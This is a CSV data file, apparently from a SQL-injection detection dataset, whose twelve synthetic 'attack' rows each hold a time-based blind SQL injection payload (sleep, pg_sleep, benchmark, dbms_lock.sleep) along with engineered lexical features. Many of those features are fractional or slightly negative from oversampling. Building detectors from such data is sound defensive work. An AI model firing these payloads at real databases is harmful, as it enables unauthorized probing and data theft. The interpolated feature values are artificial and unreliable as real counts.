id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000189,attack,time,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000221,0.8286566117828612,71.50813507828502,27.98372984342997,3.730824868662343,24.0,10.0,28.508135078285015,9.0,0.3357070342826722,0.13987793095111342,0.3985248969102123,0.12589013785600206,0.16937835942833845,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.8306216405716615,1.0,1.0,0.16937835942833834,0.0,0.0,0.16937835942833834,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.1693783594283384,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1693783594283382
SMOTE_000190,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv",nearest_attack_euclidean,R000144,0.3238880783247678,68.14537317259894,19.911894371338544,2.861851988482444,18.26431688598437,2.0,36.704845029291654,11.176211257322914,0.26811427504742014,0.029423368219179513,0.5384311908113767,0.16403116592202366,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,6.1762112573229135,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.9118943713385432,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.911894371338543
SMOTE_000191,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000099,0.5416670446906295,83.53095529261627,20.765477646308135,2.9423158232869002,28.0,2.0,42.765477646308135,10.765477646308135,0.3352400191357062,0.023945715652550437,0.5119728578262752,0.12884140738546812,0.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.7654776463081344,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000192,attack,time,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000162,0.07537551695235707,71.03556556689169,25.053348350337536,3.5561740181272086,15.071131133783382,21.0,27.946651649662464,7.0177827834458455,0.21213907524507905,0.29563054661301846,0.39344326283099895,0.09878711531090356,0.0,0.0,0.035565566891690714,0.0,0.0,1.0,0.0,4.9822172165541545,0.0,0.0,1.0,1.0355655668916903,0.0,0.0,0.017782783445845357,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000193,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf,nearest_attack_euclidean,R000279,1.5334652135114,74.98837028052856,19.139534365865302,2.9115528160480504,23.290698451202047,2.0,38.55813746346121,11.139534365865302,0.3121939929617428,0.02672864923057834,0.5128246967077961,0.1482526610998828,4.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,7.139534365865302,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.5697671829326508,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.569767182932651
SMOTE_000194,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000121,0.913766075230503,82.81808112919015,19.690848677514094,2.909860960252409,27.818081129190155,1.5636162258380306,42.0,11.43638377416197,0.33529330325080275,0.018716355432037132,0.5075942047902962,0.13839613652686406,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.0,0.0,0.0,1.436383774161969,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000195,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,0.3540298447805808,72.4751762947829,24.0,3.4037670165881755,19.0,10.0,32.39598024565241,11.079196049130482,0.2639805070705371,0.1389371089844932,0.44430942817675234,0.15277295576821737,0.0,1.0,2.0,0.0,0.0,1.0,0.0,5.079196049130482,1.0,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000196,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000012,0.4551243133499863,72.83553313636133,24.506599409084018,3.516147379414892,15.835533136361338,18.0,30.0,9.0,0.21739448036008302,0.24713858514944748,0.41189764191574574,0.12356929257472372,1.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8355331363613387,0.16446686363866136,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000197,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R000213,0.11947763170369728,73.29094694147973,22.064654875884386,3.4783395388091227,21.967672562057807,10.0,30.25861950353754,11.064654875884385,0.2999063254790621,0.13650025569415347,0.41265466346706453,0.15093875535971985,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,4.064654875884385,0.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.9676725620578077,0.03232743794219223,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000198,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000053,1.0356658761013249,84.38901672620219,27.221966547595617,3.7283174484988497,30.389016726202193,10.0,33.0,11.0,0.3600850004502687,0.11850277769439468,0.39105916639150246,0.13035305546383416,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,4.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.389016726202192,0.6109832737978078,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000199,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000249,0.1690017883218616,78.6474279641679,21.0,3.0634340779950078,28.0,2.0,38.51794237133433,10.129485592833582,0.35617423802954873,0.025441017002110627,0.48961959257425036,0.12876515239409025,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.129485592833582,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000200,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000225,0.9196971874122771,69.80385167433856,15.823555622123042,2.449270122341812,11.549037081415362,2.0,41.80385167433856,14.45096291858464,0.16659902375090752,0.028730967155235,0.5977664598267101,0.2069035492671475,4.0,0.0,0.0,0.0,0.0,1.0,0.0,7.450962918584639,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.7254814592923196,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7254814592923196
